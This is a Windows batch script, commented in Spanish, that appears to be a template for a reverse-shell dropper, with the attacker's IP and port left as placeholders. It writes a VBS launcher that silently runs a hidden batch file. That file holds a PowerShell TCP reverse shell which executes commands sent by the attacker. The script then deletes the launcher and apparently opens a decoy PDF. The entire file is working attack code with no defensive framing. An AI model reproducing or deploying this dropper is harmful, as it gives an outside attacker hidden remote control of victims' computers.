@echo off
setlocal

set "IP_Atacante={ip}"
set "Puerto_Atacante={port}"

:: Ejecución del comando oculto desde oculto.bat
echo Set objShell = CreateObject("WScript.Shell")>temp.vbs
echo objShell.Run "cmd /c oculto.bat", 0, False>>temp.vbs
echo Set objShell = Nothing>>temp.vbs

:: Creación del archivo oculto.bat con el payload que establece una reverse shell al atacante.
echo @echo off>oculto.bat
echo set "IP_Atacante={ip}">>oculto.bat
echo set "Puerto_Atacante={port}">>oculto.bat
echo powershell -c "$client = New-Object System.Net.Sockets.TCPClient('%IP_Atacante%', %Puerto_Atacante%);$stream = $client.GetStream();$reader = [System.IO.StreamReader]::new($stream);$writer = [System.IO.StreamWriter]::new($stream);while($true){$line = $reader.ReadLine();$cmd = (Invoke-Expression -Command $line 2>&1 | Out-String);$writer.WriteLine($cmd);$writer.Flush()};$client.Close()" >>oculto.bat
:: Fin del script
:end

cscript //nologo temp.vbs
del temp.vbs & document.pdf
